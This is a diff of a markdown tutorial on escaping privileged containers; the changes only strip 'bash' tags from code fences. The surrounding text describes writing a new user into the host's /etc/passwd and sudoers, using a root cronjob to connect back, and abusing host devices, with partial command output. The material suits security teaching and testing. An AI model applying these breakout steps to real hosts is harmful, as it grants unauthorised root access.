@@ -22,7 +22,7 @@ Lets assume that the host root directory is accessible at `/hostfs`
 
 To escalate to the host, we create a user in the file `/hostfs/etc/passwd` and add the user to the sudoer’s. After the user is prepared, we connect via SSH to the host. Okay, it is a kind of flaky, because certain packages must have been installed and services running, you get the idea :)
 
-```bash 
+```
 # cat /hostfs/etc/passwd | grep 1000
 user:x:1000:1000::/home/user:/bin/bash
 # openssl passwd -6 -salt xyz test
@@ -45,7 +45,7 @@ We have assumed that there is a SSH daemon running on the host, the service is n
 
 Another approach would be to write a cronjob file that get triggered every minute and connects to our container as root user.
 
-```bash 
+```
 # ip a
 […]
 6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
@@ -76,7 +76,7 @@ There are plenty ways to escape from a privileged container. Let’s have a star
 
 I prefer to use the host devices to escape from a privileged container. A quick directory listing of the devices in the container shows that we have access to all of them:
 
-```bash
+```
 root@0462216e684b:~# ls -l /dev/
 total 0
 crw-r--r-- 1 root root  10, 235 Jul 11 09:20 autofs
